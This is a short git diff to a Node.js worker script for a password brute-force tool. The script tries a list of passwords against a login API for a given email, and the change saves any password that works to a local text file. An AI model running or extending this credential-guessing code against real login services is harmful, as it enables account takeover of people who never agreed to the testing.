@@ -2,6 +2,10 @@ import chalk from 'chalk'
 import 'dotenv/config'
 import { workerData, parentPort } from 'worker_threads'
 
+import path from 'path'
+import fs from 'fs'
+const fileName='correctPw-BruteForce.txt'
+
 // Get data sent by Worker thread
 const {API_URL,email,passwords,t1} = workerData
 
@@ -23,6 +27,7 @@ async function bruteForceAttack(password){
         if(response.ok){
             const t2 = Date.now()
             console.log(chalk.green.bold(`Login Successfully Email:${email} , Password:${password} valid, time: ${(t2-t1)/1000}s`));
+            fs.writeFileSync(path.resolve(fileName),password,'utf-8')
             process.exit(0)
         }
         
